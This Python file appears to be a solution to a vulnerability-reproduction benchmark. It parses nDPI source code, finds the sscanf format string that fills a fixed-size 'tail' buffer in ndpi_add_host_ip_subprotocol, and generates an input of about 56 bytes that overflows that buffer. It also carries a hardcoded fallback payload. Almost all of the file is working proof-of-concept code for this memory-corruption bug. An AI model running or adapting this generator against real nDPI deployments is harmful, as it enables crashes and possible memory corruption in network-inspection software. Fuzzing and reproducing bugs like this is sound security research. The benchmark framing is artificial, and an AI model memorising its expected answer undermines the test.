import io
import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            fmt_info = self._extract_scanf_format_for_tail(src_path)
            if fmt_info is None:
                return self._fallback_payload()
            fmt_str, arg_index_of_tail, tail_size = fmt_info
            # Build an input string matching fmt_str, with overflowing tail field
            payload = self._build_input_from_scanf_format(fmt_str, arg_index_of_tail, tail_size)
            if not payload:
                return self._fallback_payload()
            return payload.encode('utf-8', 'ignore')
        except Exception:
            return self._fallback_payload()

    def _fallback_payload(self) -> bytes:
        # Generic conservative payloads that often trigger %s overflows when present
        # Using length near ground-truth as hint but ensure overflow by being > typical small buffers
        base = "host:A:"
        long_tail = "B" * 40  # likely to overflow small tail buffers
        payload = (base + long_tail)[:56]
        if len(payload) < 8:  # ensure non-trivial
            payload = "1 " + ("B" * 55)
        return payload.encode('utf-8', 'ignore')

    def _extract_scanf_format_for_tail(self, src_path):
        # Returns (format_string, arg_index_of_tail, tail_buffer_size) or None
        with tarfile.open(src_path, 'r:*') as tf:
            # Try the stated path first
            candidates = []
            for m in tf.getmembers():
                name = m.name
                low = name.lower()
                if low.endswith('ndpi_main.c') and ('src/lib/' in low or 'src\\lib\\' in low or 'lib/' in low):
                    candidates.append(m)
            # Fallback: any file containing function name hint
            if not candidates:
                for m in tf.getmembers():
                    low = m.name.lower()
                    if low.endswith('.c'):
                        candidates.append(m)
            target_text = None
            chosen_member = None
            for m in candidates:
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    text = f.read().decode('utf-8', 'ignore')
                except Exception:
                    continue
                if 'ndpi_add_host_ip_subprotocol' in text:
                    target_text = text
                    chosen_member = m
                    break
            if target_text is None:
                # Try any file containing "tail[" to search the pattern
                for m in candidates:
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        text = f.read().decode('utf-8', 'ignore')
                    except Exception:
                        continue
                    if re.search(r'\bndpi_add_host_ip_subprotocol\s*\(', text):
                        target_text = text
                        chosen_member = m
                        break
            if target_text is None:
                return None

        func_body = self._extract_function_body(target_text, 'ndpi_add_host_ip_subprotocol')
        if not func_body:
            # fallback: search in whole file
            func_body = target_text

        # Find tail buffer size
        tail_size = None
        msz = re.search(r'\bchar\s+tail\s*\[\s*(\d+)\s*\]\s*;', func_body)
        if msz:
            try:
                tail_size = int(msz.group(1))
            except Exception:
                tail_size = None

        # Locate sscanf calls that use 'tail'
        for call in self._find_function_calls(func_body, 'sscanf'):
            # call is dict: {'args': [args...], 'raw': raw_text}
            args = call['args']
            if len(args) < 3:
                continue
            # sscanf(str, fmt, ...)
            fmt_arg = args[1].strip()
            # Does 'tail' appear in varargs?
            vargs = args[2:]
            arg_index_of_tail = None
            for i, a in enumerate(vargs):
                if re.search(r'\btail\b', a):
                    arg_index_of_tail = i
                    break
            if arg_index_of_tail is None:
                continue
            # Extract format string literal
            fmt_str = self._concat_c_string_literals(fmt_arg)
            if not fmt_str:
                # perhaps fmt is a macro containing string literal, try to find a quoted section
                fmt_str = self._extract_first_string_literal(fmt_arg)
            if not fmt_str:
                continue
            # Validate format string looks like scanf format
            if '%' not in fmt_str:
                continue
            # Good match found
            return (fmt_str, arg_index_of_tail, tail_size)

        return None

    def _extract_function_body(self, text, func_name):
        # Find "func_name(" then the block {...} matching braces
        m = re.search(r'\b%s\s*\(' % re.escape(func_name), text)
        if not m:
            return None
        start = m.start()
        # Move to the opening brace after the function signature
        # We'll find the first '{' after the matched '(' closing
        # First, find balanced parentheses for the signature
        i = m.end() - 1
        paren = 0
        n = len(text)
        while i < n:
            ch = text[i]
            if ch == '(':
                paren += 1
            elif ch == ')':
                paren -= 1
                if paren == 0:
                    break
            i += 1
        # Now find the first '{' after i
        while i < n and text[i] != '{':
            i += 1
        if i >= n or text[i] != '{':
            return None
        # Extract body by balancing braces
        brace = 0
        body_start = i
        j = i
        while j < n:
            ch = text[j]
            if ch == '{':
                brace += 1
            elif ch == '}':
                brace -= 1
                if brace == 0:
                    # include last brace
                    return text[body_start:j + 1]
            j += 1
        return None

    def _find_function_calls(self, text, func_name):
        # Return list of call info with arguments as strings
        calls = []
        pattern = re.compile(r'\b' + re.escape(func_name) + r'\s*\(')
        pos = 0
        n = len(text)
        while True:
            m = pattern.search(text, pos)
            if not m:
                break
            start = m.end()  # points after '('
            # Extract until matching ')'
            i = start
            depth = 1
            in_s = False
            esc = False
            while i < n and depth > 0:
                ch = text[i]
                if in_s:
                    if esc:
                        esc = False
                    elif ch == '\\':
                        esc = True
                    elif ch == '"':
                        in_s = False
                else:
                    if ch == '"':
                        in_s = True
                    elif ch == '(':
                        depth += 1
                    elif ch == ')':
                        depth -= 1
                i += 1
            raw_args = text[start:i - 1] if depth == 0 else text[start:i]
            args = self._split_args_top_level(raw_args)
            calls.append({'args': args, 'raw': text[m.start():i]})
            pos = i
        return calls

    def _split_args_top_level(self, s):
        # Split by commas not inside parentheses or string literals
        args = []
        buf = []
        depth = 0
        in_s = False
        esc = False
        for ch in s:
            if in_s:
                buf.append(ch)
                if esc:
                    esc = False
                elif ch == '\\':
                    esc = True
                elif ch == '"':
                    in_s = False
            else:
                if ch == '"':
                    in_s = True
                    buf.append(ch)
                elif ch == '(':
                    depth += 1
                    buf.append(ch)
                elif ch == ')':
                    depth -= 1
                    buf.append(ch)
                elif ch == ',' and depth == 0:
                    args.append(''.join(buf).strip())
                    buf = []
                else:
                    buf.append(ch)
        if buf:
            args.append(''.join(buf).strip())
        return args

    def _concat_c_string_literals(self, s):
        # Concatenate adjacent C string literals in the argument string s
        # e.g., "abc" "def" => "abcdef"
        # Returns None if no string literal found
        res = []
        i = 0
        n = len(s)
        found = False
        while i < n:
            while i < n and s[i].isspace():
                i += 1
            if i < n and s[i] == '"':
                found = True
                lit, j = self._parse_c_string(s, i)
                if lit is None:
                    return None
                res.append(lit)
                i = j
            else:
                # If there is any non-string token, break unless we have already collected some
                # This accommodates macros like SOME_MACRO "part"
                i += 1
        if not found:
            return None
        return ''.join(res)

    def _extract_first_string_literal(self, s):
        i = 0
        n = len(s)
        while i < n:
            if s[i] == '"':
                lit, j = self._parse_c_string(s, i)
                return lit
            i += 1
        return None

    def _parse_c_string(self, s, i0):
        # Parse C string literal starting at s[i0] == '"'
        i = i0 + 1
        n = len(s)
        out = []
        esc = False
        while i < n:
            ch = s[i]
            if esc:
                # Handle simple escapes
                if ch in ['\\', '"', 'n', 'r', 't', '0', 'a', 'b', 'f', 'v']:
                    if ch == 'n':
                        out.append('\n')
                    elif ch == 'r':
                        out.append('\r')
                    elif ch == 't':
                        out.append('\t')
                    elif ch == '0':
                        out.append('\0')
                    elif ch == '"':
                        out.append('"')
                    elif ch == '\\':
                        out.append('\\')
                    else:
                        # control chars map to themselves for our purposes
                        out.append(ch)
                else:
                    out.append(ch)
                esc = False
            else:
                if ch == '\\':
                    esc = True
                elif ch == '"':
                    return ''.join(out), i + 1
                else:
                    out.append(ch)
            i += 1
        return None, n

    def _build_input_from_scanf_format(self, fmt_str, tail_arg_index, tail_size):
        # Parse scanf format and build input string with long value for 'tail' arg
        tokens = self._tokenize_scanf_format(fmt_str)
        if not tokens:
            return ''
        # Map specifier index to actual vararg index
        spec_index = 0
        parts = []
        for tok in tokens:
            if tok['type'] == 'L':
                # Literal: whitespace in format matches any whitespace; we insert exact literal char
                lit = tok['value']
                # collapse any '% ' whitespace sequences into single space in output to be minimal
                # But non-whitespace must match exactly
                if lit.strip() == '':
                    parts.append(' ')
                else:
                    parts.append(lit)
            elif tok['type'] == 'S':
                if tok.get('assign_suppressed', False):
                    # No corresponding argument; we still need to supply input matching the specifier
                    val = self._value_for_specifier(tok, False, None)
                    parts.append(val)
                else:
                    # This corresponds to current vararg
                    is_tail = (spec_index == tail_arg_index)
                    val = self._value_for_specifier(tok, is_tail, tail_size)
                    parts.append(val)
                    spec_index += 1
        s = ''.join(parts)
        # Trim or pad to avoid being overly long; prefer to be <= 80 bytes unless needed longer
        if len(s) > 256:
            s = s[:256]
        # Try to approximate target length (~56) if possible without reducing overflow
        # Only adjust if overflow margin is large
        if len(s) > 56 and tail_size is not None:
            # find last long sequence of 'B's we inserted for tail and trim
            idx = s.find('B' * 8)
            if idx != -1:
                # keep at least tail_size+1
                min_len = tail_size + 1
                pre = s[:idx]
                tail_seq = s[idx:]
                # find contiguous B's from idx
                j = idx
                while j < len(s) and s[j] == 'B':
                    j += 1
                bs = s[idx:j]
                post = s[j:]
                need = min_len
                if need < 1:
                    need = 1
                # Try to set total length around 56
                target_total = 56
                # total = len(pre) + need + len(post)
                # compute possible bs_len
                bs_len = max(need, target_total - (len(pre) + len(post)))
                if bs_len < need:
                    bs_len = need
                if bs_len < 1:
                    bs_len = 1
                new_bs = 'B' * bs_len
                s = pre + new_bs + post
        return s

    def _tokenize_scanf_format(self, fmt):
        tokens = []
        i = 0
        n = len(fmt)
        while i < n:
            ch = fmt[i]
            if ch == '%':
                if i + 1 < n and fmt[i + 1] == '%':
                    # literal %
                    tokens.append({'type': 'L', 'value': '%'})
                    i += 2
                    continue
                # parse specifier
                j = i + 1
                assign_suppressed = False
                width = None
                length_mod = ''
                scanset = None
                # suppression
                if j < n and fmt[j] == '*':
                    assign_suppressed = True
                    j += 1
                # width
                wstart = j
                while j < n and fmt[j].isdigit():
                    j += 1
                if j > wstart:
                    try:
                        width = int(fmt[wstart:j])
                    except Exception:
                        width = None
                # length modifiers
                # Accept h, hh, l, ll, z, j, t, L
                if j < n and fmt[j] in 'hlLjzt':
                    length_mod += fmt[j]
                    j += 1
                    if j < n and ((length_mod == 'h' and fmt[j] == 'h') or (length_mod == 'l' and fmt[j] == 'l')):
                        length_mod += fmt[j]
                        j += 1
                # type
                if j >= n:
                    # malformed; treat as literal
                    tokens.append({'type': 'L', 'value': fmt[i:]})
                    break
                t = fmt[j]
                j += 1
                if t == '[':
                    # scanset until closing ']'
                    k = j
                    # if first char is '^' or ']' handle semantics; for our construction not critical
                    while k < n and fmt[k] != ']':
                        k += 1
                    scanset = fmt[j:k]
                    t = '[]'
                    j = k + 1 if k < n else n
                spec = {
                    'type': 'S',
                    'spec': t,
                    'assign_suppressed': assign_suppressed,
                    'width': width,
                    'length_mod': length_mod
                }
                if scanset is not None:
                    spec['scanset'] = scanset
                tokens.append(spec)
                i = j
            else:
                # literal; accumulate until next %
                j = i
                lit = []
                while j < n and fmt[j] != '%':
                    lit.append(fmt[j])
                    j += 1
                tokens.append({'type': 'L', 'value': ''.join(lit)})
                i = j
        return tokens

    def _value_for_specifier(self, tok, is_tail, tail_size):
        t = tok['spec']
        width = tok.get('width', None)
        # We generate minimal-valid tokens to keep overall short, except for the tail
        if t in ('d', 'i', 'u', 'o', 'x', 'X'):
            return '1'
        if t in ('f', 'F', 'e', 'E', 'g', 'G', 'a', 'A'):
            return '1.0'
        if t == 's':
            if is_tail:
                # Overflow tail: produce longer than buffer
                # If width is specified, we still produce long; scanf will limit
                if tail_size is None:
                    n = 64
                else:
                    n = max(tail_size + 8, 40)
                return 'B' * n
            else:
                # Minimal token
                return 'A'
        if t == 'c':
            # For %c width may be provided; if width present, it reads exactly width chars incl. whitespace
            w = width if width is not None else 1
            return 'C' * w
        if t == 'p':
            return '0x1'
        if t == 'n':
            # No input consumed; return empty
            return ''
        if t == '[]':
            scanset = tok.get('scanset', '')
            # If scanset starts with '^', it matches any char not in the set; provide 'X' or 'A' that is likely not excluded
            # We'll provide minimal 1 char, and rely on following literal/whitespace to terminate.
            candidate = 'Z'
            if scanset and scanset[0] != '^':
                # Want char included in scanset
                # try to pick first char if not special
                ch = scanset[0]
                if ch == ']':
                    # pattern like []a], initial ']' included; choose next char
                    if len(scanset) > 1:
                        ch = scanset[1]
                if ch == '^' and len(scanset) > 1:
                    ch = scanset[1]
                candidate = ch if ch not in '\\' else 'Z'
            # For tail, produce overflow
            if is_tail:
                if tail_size is None:
                    n = 64
                else:
                    n = max(tail_size + 8, 40)
                return candidate * n
            else:
                return candidate
        # Default: return a safe token
        return 'A'